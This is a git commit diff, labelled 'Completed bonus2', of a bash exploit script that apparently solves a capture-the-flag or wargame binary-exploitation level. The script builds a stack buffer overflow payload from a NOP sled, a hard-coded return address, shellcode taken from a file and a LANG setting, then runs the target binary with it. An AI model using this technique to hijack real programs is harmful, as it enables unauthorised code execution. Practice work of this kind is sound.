131d9c2d3e21dbbd251b6b83babf8aa7757e8b8c
miniske <miniske@Debian-Seb-PC.Debian-Seb-PC>
2019-04-26 15:52:08 +0200

    Completed bonus2

--- bonus2/script.sh
+++ bonus2/script.sh
@@ -1,17 +1,18 @@
 #!/bin/bash
 export LANG="`echo -ne '\x6e\x6c'`"
+export PAYLOAD="`python -c 'import sys; sys.stdout.write("\x90" * 90000)'``cat bin`"
 
-
-TARGET_EIP="ABCD"
+0xbfffff9f
+TARGET_EIP="\x9f\xff\xff\xbf"
 TOTAL_PAYLOAD="`cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin`"
 
 
 FIRST="`python -c 'import sys; sys.stdout.write("\x90" * 42);'`"
-SECOND="`python -c 'import sys; sys.stdout.write("\xA0" * 200);'``python -c "import sys; sys.stdout.write(\\"$TARGET_EIP\\" * 40)"`$TOTAL_PAYLOAD`python -c 'import sys; sys.stdout.write("\xBA\xBA\xBA\xBA" * 123);'`"
+SECOND="`python -c 'import sys; sys.stdout.write("\xA0" * 3);'``python -c "import sys; sys.stdout.write(\\"$TARGET_EIP\\" * 8)"`$TOTAL_PAYLOAD`python -c 'import sys; sys.stdout.write("\xBA\xBA\xBA\xBA" * 123);'`"
 
 echo '__hex_first='
 echo "$FIRST" | hexdump -C
 echo '__hex_second='
 echo "$SECOND" | hexdump -C  
 
-gdb -x gdb.script --args ./bonus2 "$FIRST" "$SECOND"
+  ./bonus2 "$FIRST" "$SECOND"
